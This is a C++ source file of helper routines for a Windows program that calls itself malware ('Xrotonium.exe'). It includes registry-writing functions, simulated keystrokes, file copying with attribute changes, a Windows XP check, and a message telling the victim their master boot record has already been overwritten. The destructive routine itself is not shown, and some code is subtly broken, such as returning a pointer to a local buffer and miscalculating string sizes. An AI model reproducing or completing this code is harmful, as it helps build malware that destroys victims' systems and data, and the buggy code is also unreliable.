#include <windows.h>

LPCWSTR GetDir(void) {
	WCHAR dir[MAX_PATH];
	GetModuleFileNameW(NULL, (WCHAR*)dir, MAX_PATH);
	return (const WCHAR*)dir;
}

namespace System {
	FLONG WINAPI ManageRegW(HKEY hKey, LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD dwType, BYTE lpData, LPBYTE lpData2, bool isSet, bool isString) {
        HKEY hkResult;
        if (isSet == false) {
            if (isString == false) {
                RegCreateKeyW(hKey, lpSubKey, &hkResult);
                RegSetValueExW(hkResult, lpValueName, 0, dwType, &lpData, sizeof(lpData));
            }
            else if (isString == true) {
                RegCreateKeyW(hKey, lpSubKey, &hkResult);
                RegSetValueExW(hkResult, lpValueName, 0, REG_SZ, lpData2, sizeof(lpData2) * 16);
            }
        }
        else if (isSet == true) {
            if (isString == false) {
                RegOpenKeyW(hKey, lpSubKey, &hkResult);
                RegSetValueExW(hkResult, lpValueName, 0, dwType, &lpData, sizeof(lpData));
            }
            else if (isString == true) {
                RegOpenKeyW(hKey, lpSubKey, &hkResult);
                RegSetValueExW(hkResult, lpValueName, 0, REG_SZ, lpData2, sizeof(lpData2) * 16);
            }
        }
    }
    
    void __stdcall rdw(void) {
    	RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE|RDW_ERASE|RDW_ALLCHILDREN);
	}
	
	void SendKeyboardInput(INPUT input, WORD wKey, UINT uTime, DWORD dwFlags) {
    input.type = INPUT_KEYBOARD;
    input.ki.wVk = wKey;
    input.ki.dwFlags = dwFlags;
    SendInput(1, &input, sizeof(input));
    ZeroMemory(&input, sizeof(input));
    Sleep(uTime);
}

	void CopyFilex(LPCWSTR file1, LPCWSTR file2, bool fail, DWORD attribs) {
		CopyFileW(file1, file2, fail);
		SetFileAttributesW(file2, attribs);
	}
	
	WINBOOL isWindowsXP(void) {
		OSVERSIONINFOW osvi;
		memset(&osvi, 0, sizeof(osvi));
		osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOW);
		GetVersionExW(&osvi);
		if (osvi.dwMajorVersion == 5) return true;
		return false;
	}
	
	void NotWindowsXP(void) {
		MessageBoxW(NULL, L"Seems like you are not running this malware on Windows XP.\nWell, I already overwrote your MBR.\nSo, use this PC as long as you can!", L"Xrotonium.exe - Exception", MB_ICONWARNING|MB_OK);
		exit(0);
	}
}
